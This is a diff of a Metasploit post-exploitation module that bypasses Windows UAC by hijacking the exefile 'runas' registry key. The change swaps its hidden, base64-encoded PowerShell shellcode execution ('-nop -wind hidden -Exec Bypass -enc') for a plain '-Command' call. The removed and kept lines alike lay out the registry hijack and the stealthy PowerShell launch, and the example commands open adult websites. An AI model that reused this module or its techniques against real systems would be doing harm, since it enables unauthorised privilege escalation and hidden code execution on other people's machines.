@@ -37,13 +37,11 @@
 # The cmd.exe command to be executed (target)  => set EXEC_COMMAND start firefox.exe www.househot.com
 # Check target vulnerability settings/status?  => set CHECK_VULN true
 # Delete malicious registry hive keys/values?  => set DEL_REGKEY true
-# Exec powershell shellcode insted of a cmd?   => set USE_POWERSHELL true
+# Use powershell.exe to execute our command?   => set USE_POWERSHELL true
 # ---
-# HINT: To deploy a powershell payload (shellcode string) we need to set the option
-# 'USE_POWERSHELL true' and input the base64 encoded 'shellcode' into 'EXEC_COMMAND'
+# HINT: To execute a powershell command we need the follow settings active:
 # EXAMPLE: set USE_POWERSHELL true
-# EXAMPLE: set EXEC_COMMAND ZWNobyAndGVzdCcgPiBjOlx0ZXN0LnR4dAo=
-# HINT: echo 'test' > c:\\test.txt -> ENCODED IN BASE64: ZWNobyAndGVzdCcgPiBjOlx0ZXN0LnR4dAo=
+# EXAMPLE: set EXEC_COMMAND start chrome.exe www.youporn.com
 # ---
 #
 #
@@ -152,7 +150,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
-                                OptBool.new('USE_POWERSHELL', [ false, 'Execute powershell shellcode insted of a cmd command?' , false]),
+                                OptBool.new('USE_POWERSHELL', [ false, 'Use powershell.exe to execute our command?' , false]),
                                 OptBool.new('DEL_REGKEY', [ false, 'Delete the malicious registry key hive?' , false])
                         ], self.class) 
 
@@ -182,8 +180,7 @@ end
   vul_value = "IsolatedCommand" # vulnerable registry value to create
   comm_path = "%SystemRoot%\\System32\\cmd.exe /c" # cmd.exe %comspec% path
   regi_hive = "REG ADD HKCU\\Software\\Classes\\exefile\\shell\\runas\\command" # registry hive key to be hijacked
-  psh_lpath = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe" # powershell.exe %comspec% path
-  psh_comma = "#{psh_lpath} -nop -wind hidden -Exec Bypass -noni -enc" # use_powershell advanced option command
+  psh_comma = "%SystemRoot%\\#{arch}\\WindowsPowershell\\v1.0\\powershell.exe -Command" # use_powershell advanced option command
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
